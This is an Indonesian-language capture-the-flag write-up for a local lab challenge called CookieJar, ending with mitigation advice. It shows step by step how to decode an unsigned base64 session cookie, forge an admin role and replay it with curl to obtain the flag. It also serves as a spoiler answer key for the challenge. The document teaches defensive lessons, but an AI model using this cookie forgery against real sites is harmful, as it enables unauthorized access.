# WRITEUP · 04 CookieJar (SPOILER)

## 1. Login & amati cookie

Login dengan user apa saja + password `password123`. Server mengeset cookie:

```
session = eyJ1c2VyIjoiZ3Vlc3QiLCJyb2xlIjoibWVtYmVyIn0=
```

Decode base64-nya:

```bash
echo 'eyJ1c2VyIjoiZ3Vlc3QiLCJyb2xlIjoibWVtYmVyIn0=' | base64 -d
# {"user":"guest","role":"member"}
```

Role kita tersimpan di sisi client, tanpa tanda tangan. Berarti bisa dipalsukan.

## 2. Palsukan role jadi admin

```bash
echo -n '{"user":"guest","role":"admin"}' | base64
# eyJ1c2VyIjoiZ3Vlc3QiLCJyb2xlIjoiYWRtaW4ifQ==
```

Kirim dengan cookie yang sudah diubah:

```bash
# Lite (9004) / Docker (8004):
curl -s -b 'session=eyJ1c2VyIjoiZ3Vlc3QiLCJyb2xlIjoiYWRtaW4ifQ==' \
  http://127.0.0.1:9004/ | grep -o 'FLAG{[^}]*}'
```

Flag muncul karena server percaya begitu saja pada `role` di cookie.

## 3. Pelajaran & mitigasi

- **Jangan simpan keputusan otorisasi di sisi client** tanpa integritas. Cookie
  role bisa diubah siapa saja.
- Simpan sesi di server (session id acak → data di server), atau kalau memakai
  token di client, **tanda tangani** (HMAC/JWT dengan secret) dan verifikasi.
- Prinsip: server tidak boleh percaya data dari client untuk hak akses.
